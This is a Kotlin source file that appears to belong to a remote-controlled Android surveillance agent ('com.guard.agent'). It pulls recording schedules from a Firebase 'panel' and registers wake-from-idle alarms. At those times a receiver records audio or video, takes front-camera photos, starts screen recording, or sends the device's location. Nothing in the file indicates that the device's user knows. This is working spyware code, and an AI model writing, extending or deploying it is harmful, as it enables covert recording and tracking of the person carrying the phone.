package com.guard.agent.helpers.media

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.utils.Logger
import java.util.Calendar

object ScheduledRecorder {

    private const val TAG = "ScheduledRecorder"
    private var listener: ValueEventListener? = null

    /**
     * Firebase se saare scheduled tasks suno.
     * Jab panel se naya schedule add ho, ye auto-register ho jayega.
     */
    fun syncSchedules(ctx: Context, deviceKey: String) {
        try {
            val ref = FirebaseDatabase.getInstance()
                .getReference("schedules").child(deviceKey)

            listener?.let { ref.removeEventListener(it) }

            listener = object : ValueEventListener {
                override fun onDataChange(snap: DataSnapshot) {
                    snap.children.forEach { child ->
                        try {
                            val id = child.key ?: return@forEach
                            val hour = child.child("hour").getValue(Int::class.java) ?: return@forEach
                            val minute = child.child("minute").getValue(Int::class.java) ?: 0
                            val type = child.child("type").getValue(String::class.java) ?: "audio"
                            val duration = child.child("duration").getValue(Int::class.java) ?: 60
                            val enabled = child.child("enabled").getValue(Boolean::class.java) ?: true

                            if (enabled) {
                                schedule(ctx, deviceKey, id, hour, minute, type, duration)
                            } else {
                                cancel(ctx, id)
                            }
                        } catch (e: Exception) {
                            Logger.e(TAG, "Parse schedule failed", e)
                        }
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.e(TAG, "Listener cancelled", error.toException())
                }
            }
            ref.addValueEventListener(listener!!)
        } catch (e: Exception) {
            Logger.e(TAG, "syncSchedules failed", e)
        }
    }

    /**
     * Ek schedule register karo.
     */
    private fun schedule(
        ctx: Context,
        deviceKey: String,
        id: String,
        hour: Int,
        minute: Int,
        type: String,
        duration: Int
    ) {
        try {
            val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager

            val intent = Intent(ctx, ScheduleReceiver::class.java).apply {
                action = "com.guard.agent.SCHEDULE_TRIGGER"
                putExtra("id", id)
                putExtra("type", type)
                putExtra("duration", duration)
                putExtra("device_key", deviceKey)
            }

            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }

            val pending = PendingIntent.getBroadcast(
                ctx,
                id.hashCode(),
                intent,
                flags
            )

            // Agla occurrence ka time nikalo
            val triggerAt = getNextTriggerTime(hour, minute)

            // Exact alarm set karo (Android 12+ pe permission zaroori)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        triggerAt,
                        pending
                    )
                } else {
                    // Fallback: approximate alarm
                    am.setAndAllowWhileIdle(
                        AlarmManager.RTC_WAKEUP,
                        triggerAt,
                        pending
                    )
                    Logger.w(TAG, "Exact alarm not allowed — using approximate")
                }
            } else {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    triggerAt,
                    pending
                )
            }

            Logger.d(TAG, "Scheduled [$id]: $type @ ${hour}:${minute} (${duration}s)")
        } catch (e: Exception) {
            Logger.e(TAG, "schedule failed", e)
        }
    }

    /**
     * Schedule cancel karo.
     */
    fun cancel(ctx: Context, id: String) {
        try {
            val am = ctx.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(ctx, ScheduleReceiver::class.java).apply {
                action = "com.guard.agent.SCHEDULE_TRIGGER"
            }
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            } else {
                PendingIntent.FLAG_UPDATE_CURRENT
            }
            val pending = PendingIntent.getBroadcast(ctx, id.hashCode(), intent, flags)
            am.cancel(pending)
            Logger.d(TAG, "Cancelled [$id]")
        } catch (e: Exception) {
            Logger.e(TAG, "cancel failed", e)
        }
    }

    /**
     * Agle occurrence ka time nikalo (agar aaj ka time nikal gaya toh kal).
     */
    private fun getNextTriggerTime(hour: Int, minute: Int): Long {
        val cal = Calendar.getInstance().apply {
            set(Calendar.HOUR_OF_DAY, hour)
            set(Calendar.MINUTE, minute)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }
        if (cal.timeInMillis <= System.currentTimeMillis()) {
            cal.add(Calendar.DAY_OF_YEAR, 1)
        }
        return cal.timeInMillis
    }

    /**
     * Listener band karo.
     */
    fun stop(ctx: Context) {
        try {
            listener?.let {
                FirebaseDatabase.getInstance()
                    .getReference("schedules")
                    .removeEventListener(it)
            }
        } catch (_: Exception) {}
        listener = null
    }
}

/**
 * Schedule trigger receiver — jab alarm fire ho.
 */
class ScheduleReceiver : BroadcastReceiver() {

    override fun onReceive(ctx: Context, intent: Intent) {
        if (intent.action != "com.guard.agent.SCHEDULE_TRIGGER") return

        try {
            val id = intent.getStringExtra("id") ?: return
            val type = intent.getStringExtra("type") ?: "audio"
            val duration = intent.getIntExtra("duration", 60)
            val deviceKey = intent.getStringExtra("device_key")
                ?: DeviceKey.get(ctx)

            Logger.d("ScheduleReceiver", "Trigger [$id]: $type for ${duration}s")

            when (type.lowercase()) {
                "audio" -> AudioHelper.record(ctx, deviceKey, duration)
                "video" -> VideoHelper.record(ctx, deviceKey, duration)
                "snap", "photo" -> CameraHelper.captureFront(ctx, deviceKey)
                "screen" -> ScreenHelper.requestScreenRecord(ctx, deviceKey, duration)
                "location" -> com.guard.agent.helpers.location.LocationHelper.sendOnce(ctx, deviceKey)
            }

            // Firebase mein trigger log
            FirebaseDatabase.getInstance()
                .getReference("schedules")
                .child(deviceKey).child(id).child("lastTrigger")
                .setValue(System.currentTimeMillis())

        } catch (e: Exception) {
            Logger.e("ScheduleReceiver", "onReceive failed", e)
        }
    }
}
